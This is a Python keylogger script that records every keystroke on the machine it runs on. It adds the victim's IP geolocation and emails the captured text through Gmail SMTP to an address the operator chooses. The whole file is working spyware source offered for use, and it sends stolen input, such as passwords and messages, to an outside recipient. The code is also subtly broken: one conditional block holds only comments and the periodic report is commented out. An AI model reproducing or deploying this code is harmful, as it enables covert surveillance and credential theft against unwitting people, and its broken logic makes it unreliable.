#python 3
#shiky keylogger
import ipapi
import keyboard # for keylogs
import smtplib # for sending email using SMTP protocol (gmail)
# Semaphore is for blocking the current thread
# Timer is to make a method runs after an `interval` amount of time
from threading import Semaphore, Timer

SEND_REPORT_EVERY = 600 # 10 minutes
EMAIL_ADDRESS = str(input("Enter your gmail emial : "))
EMAIL_PASSWORD = str(input("Enter you gmail pass : "))
EMAIL_ADDRESS_2 = str(input("Enter an email address to send info to :  "))

class Keylogger:
    def __init__(self, interval):
        # we gonna pass SEND_REPORT_EVERY to interval
        self.interval = interval
        # this is the string variable that contains the log of all
        # the keystrokes within `self.interval`
        self.log = ""
        # for blocking after setting the on_release listener
        self.semaphore = Semaphore(0)

    def callback(self, event):
        """
        This callback is invoked whenever a keyboard event is occured
        (i.e when a key is released in this example)
        """
        name = event.name
        if len(name) > 1:
            # not a character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if name == "space":
                # " " instead of "space"
                name = " "
            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"

        self.log += name
        #print(self.log)

    def sendmail(self, email, password, email22, message):
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)

        server.starttls()

        server.login(email, password)

        # server.sendmail(email, email, message)
        server.sendmail(email, email22, message)
        server.quit()
    def data_ip(self):

        gi = ipapi.location(ip=None, key=None, field=None)
        d1=" "
        for key, val in gi.items():
            a = ('%s : %s' % (key, val))
            d1+=" "+a
        d1+=" copy the ip and  go to this site to get it on google map "
        d1+="https://www.ipvoid.com/ip-to-google-maps/"
            #self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, EMAIL_ADDRESS_2 ,d1)
            #time.sleep(SEND_REPORT_EVERY)
        self.log +="     "+ d1
        self.sendmail(EMAIL_ADDRESS,EMAIL_PASSWORD,EMAIL_ADDRESS_2,self.log)
        #print(self.log)

    def report(self):
        """
        This function gets called every `self.interval`
        It basically sends keylogs and resets `self.log` variable
        """
        if self.log:
            # if there is something in log, report it
            #self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            # can print to a file, whatever you want
            #print(self.log)
        self.log = ""
        Timer(interval=self.interval, function=self.report).start()

    def start(self):
            # start the keylogger
            keyboard.on_release(callback=self.callback)
            # start reporting the keylogs
            self.report()
            self.data_ip()
            # block the current thread,
            # since on_release() doesn't block the current thread
            # if we don't block it, when we execute the program, nothing will happen
            # that is because on_release() will start the listener in a separate thread
            self.semaphore.acquire()

if __name__ == "__main__":
        keylogger = Keylogger(interval=SEND_REPORT_EVERY)
        keylogger.start()
